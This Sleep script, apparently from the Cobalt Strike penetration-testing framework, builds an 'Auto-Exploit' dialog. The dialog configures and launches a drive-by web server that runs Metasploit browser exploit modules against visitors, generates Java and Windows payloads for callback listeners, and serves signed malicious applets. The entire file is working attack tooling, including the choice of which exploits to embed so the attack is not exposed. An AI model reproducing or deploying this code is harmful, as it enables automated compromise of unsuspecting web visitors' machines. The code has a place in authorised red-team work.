#
# Web-based Attacks
#

import ui.*;

import javax.swing.*;
import javax.swing.event.*;

import java.awt.*;
import java.awt.event.*;

import java.net.*;
import cloudstrike.*;

# it's a "threat" tactic alright....
sub startCrimeKit {
	local('$dialog %options @functions $a $start $help @collections');

        $dialog = dialog("Auto-Exploit", 640, 480);

	# collections?
	@collections = @('default', 'java exploits only', 'safe to embed');

        # pre-set some of the options
	%options['Port']       = '80';
	%options['APort']      = '8080';
	%options['URIPATH']    = '/0wnersh1p';
	%options['Collection'] = 'default';

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:text(    "Control URI: *",      "URIPATH",    @functions, %options),
		ui:text(    "Control Port: *",     "Port",       @functions, %options),
		ui:text(    "Attack Port:",        "APort",      @functions, %options),
		ui:combobox("Exploit List:",       "Collection", @functions, %options, @collections),
		ui:listener("Windows Listener:"  , "wlistener",  @functions, %options, '*windows*'),
		ui:listener("Java Listener:"     , "jlistener",  @functions, %options, '*java*'),
	), 3);

        # add a slash to the end of the URI always.
        push(@functions, &fixURIOption);

	# buttons?
	$help  = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-auto-web-exploit")];

	$start = ui:action_noclose("Launch", @functions, %options, $dialog, lambda({
		thread(lambda({
			if (%options['jlistener'] eq "") {
				showError("I need a Java listener");
				return;
			}
			else if (%options['wlistener'] eq "") {
				showError("I need a Windows listener");
				return;
			}

			[$dialog setVisible: 0];

			local('%o %before @attacks %e $jid $desc $attack $url @new $status $jdata $wdata $x');

			# Step 1. load a list of exploits to configure
			local('$handle $text %scores %exploits $module $score');
			$handle = [SleepUtils getIOHandle: resource("resources/webauto.txt"), $null];
			while $text (readln($handle)) {
				($module, $score) = split('\\t+', $text);
				if ($module in @exploits) {
					%scores[$module] = $score;
				}
			}
			closef($handle);

			if (%options['Collection'] eq "safe to embed") {
				foreach $module => $score (%scores) {
					# remove PDF exploits and flash exploits - they need to show to be effective and we don't want to blow our shot
					if ("*adobe*" iswm $module) {
						remove();
					}
				}
			}
			else if (%options['Collection'] eq "java exploits only") {
				%scores = %();
			}

			# Step 2. generate raw Java listener data
			%o = %(Format => "raw", EXITFUNC => "thread", Encoder => "generic/none", DisablePayloadHandler => "true", listener => %options['jlistener']);
			%o['PAYLOAD'] = fixListenerOptions(%o);
			$jdata = call($client, "module.execute", "payload", "payload/" . %o['PAYLOAD'], %o)["payload"];

			# Step 3. generate raw Windows payload
			%o = %(Format => "raw", EXITFUNC => "thread", Encoder => "generic/none", DisablePayloadHandler => "true", listener => %options['wlistener']);
			%o['PAYLOAD'] = fixListenerOptions(%o);
			$wdata = [msf.Base64 encode: cast(call($client, "module.execute", "payload", "payload/" . %o['PAYLOAD'], %o)["payload"], 'b')];

			# Step 4. setup our modules for Windows.
			%o = %();
			%o['SRVPORT'] = int(%options['APort']);
			%o['SRVHOST'] = '0.0.0.0';
			%o['listener'] = %options['wlistener'];
			%o['PAYLOAD'] = fixListenerOptions(%o, $nocustomhttp => 1); 
			%o['DisablePayloadHandler'] = 'true';
			%o['listener'] = $null;
			%o['SSL']      = 'false';

			# Step 5. loop through our modules and execute them one at a time (assume they are windows modules!)
			foreach $module => $score (%scores) {
				if ($client is $mclient) {
					# we're not connected to a team server, module executes are not async
					$jid = call($client, "module.execute", "exploit", "exploit/ $+ $module", %o)['job_id'];
				}
				else {
					# we are connected to a team server, need a non-async module execute to get output
					$jid = call($client, "module.execute_direct", "exploit", "exploit/ $+ $module", %o)['job_id'];
				}

				if ($jid is $null) {
					print_error("I could not start $module => " . %o);
				}
				else {
					push(@new, "$jid");
				}
				yield 10;
			}

			# Step 6. loop through our exploits... and grab their URLs
			foreach $attack (listClientSideAttacks()) {
				($jid, $desc, $url) = values($attack, @('jid', 'Attack', 'URL'));
				if ("$jid" in @new) {
					foreach $module => $score (%scores) {
						if ("* $+ $module $+ *" iswm $desc) {
							%exploits[$module] = $url;
						}
					}
				}
			}

			# Step 7. Let Cortana rewrite the applet parameters
			local('$classa $jara $classb $jarb');
			($classa, $classb, $jara, $jarb) = @("Java.class", "JavaApplet.class", "resources/applet_signed.jar", "resources/applet_rhino.jar");
			($classa, $jara) = filter_data("cobaltstrike_signed_applet", $classa, $jara);
			($classb, $jarb) = filter_data("cobaltstrike_smart_applet", $classb, $jarb);

				# read in our first jar file, cast it to a byte[] array
			$handle = [SleepUtils getIOHandle: resource($jara), $null];
			$jara = readb($handle, -1);
			closef($handle);

				# read in our second jar file, cast it to a byte[] array too
			$handle = [SleepUtils getIOHandle: resource($jarb), $null];
			$jarb = readb($handle, -1);
			closef($handle);

			# Step 8. start up the server...
			$status = call($mclient, "cloudstrike.auto_exploit", %options["Port"], %options["URIPATH"], join(" ", @new), %exploits, %scores, $wdata, $jdata, $classa, $jara, $classb, $jarb);
			if ($status['status'] eq "success") {
				startedWebService("auto-exploit", "http:// $+ $MY_ADDRESS $+ :" . %options["Port"] . %options["URIPATH"]);
				elog("started auto-exploit server @ http:// $+ $MY_ADDRESS $+ :" . %options["Port"] . %options["URIPATH"]);
			}
			else {
				# clean up...
				map({ call_async($client, "job.stop", $1); }, @new);
				[$dialog setVisible: 1];
				showError("Unable to start web server:\n" . $status['status']);
			}
		}, %options => $1, \$dialog));
	}, \$dialog));

        # set up the dialog.
	[$dialog add: description("Cobalt Strike's auto-exploit server intelligently exploits visitors based on their system profile."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($start, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
	[$dialog show];
}
